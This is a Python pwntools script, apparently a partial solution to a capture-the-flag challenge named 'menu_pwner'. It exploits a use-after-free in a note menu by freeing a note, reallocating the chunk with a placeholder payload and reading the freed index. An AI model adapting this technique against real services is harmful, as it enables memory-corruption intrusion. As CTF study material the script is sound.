#!/usr/bin/env python3

from pwn import *
import struct

# Set up the connection
def get_connection():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return remote("ctf.dscctf.com", 9999)
    else:
        return process("./menu_pwner")

def solve():
    p = get_connection()
    
    # Receive banner
    p.recvuntil(b"Choice: ")
    
    print("[+] Creating first note...")
    # Add a note (index 0)
    p.sendline(b"1")  # Add note
    p.recvuntil(b"Note size")
    p.sendline(b"32")  # Size
    p.recvuntil(b"Note content:")
    p.sendline(b"AAAA")  # Content
    p.recvuntil(b"Choice: ")
    
    print("[+] Getting debug info...")
    # Check debug stats to get address
    p.sendline(b"6")  # Debug stats
    output = p.recvuntil(b"Choice: ")
    print(output.decode())
    
    print("[+] Deleting note (UAF vulnerability)...")
    # Delete the note (UAF - pointer not cleared!)
    p.sendline(b"3")  # Delete
    p.recvuntil(b"Note index:")
    p.sendline(b"0")
    p.recvuntil(b"Choice: ")
    
    print("[+] Finding trigger_admin address...")
    # Get the address of trigger_admin function
    # This would need to be adjusted based on the actual binary
    # For demo purposes, we'll use a placeholder
    
    # In a real exploit, you'd:
    # 1. Use objdump/gdb to find trigger_admin address
    # 2. Calculate offset from leaked addresses
    # 3. Account for ASLR if present
    
    print("[+] Creating second note with payload...")
    # Add another note of the same size (gets the same freed chunk)
    p.sendline(b"1")  # Add note
    p.recvuntil(b"Note size")
    p.sendline(b"32")  # Same size
    p.recvuntil(b"Note content:")
    
    # This is where you'd put the trigger_admin function address
    # For simplicity, we'll just put a recognizable pattern
    payload = b"trigger_admin_here!!" + b"A" * 10
    p.sendline(payload)
    p.recvuntil(b"Choice: ")
    
    print("[+] Attempting to view deleted note (UAF)...")
    # Try to view the deleted note (should access our controlled data)
    p.sendline(b"4")  # View note
    p.recvuntil(b"Note index:")
    p.sendline(b"0")  # The deleted note
    
    # This is where the magic happens - if we could overwrite a function pointer
    # or return address, we could redirect execution to trigger_admin
    
    response = p.recvall(timeout=2)
    print(response.decode())
    
    p.close()

if __name__ == "__main__":
    solve()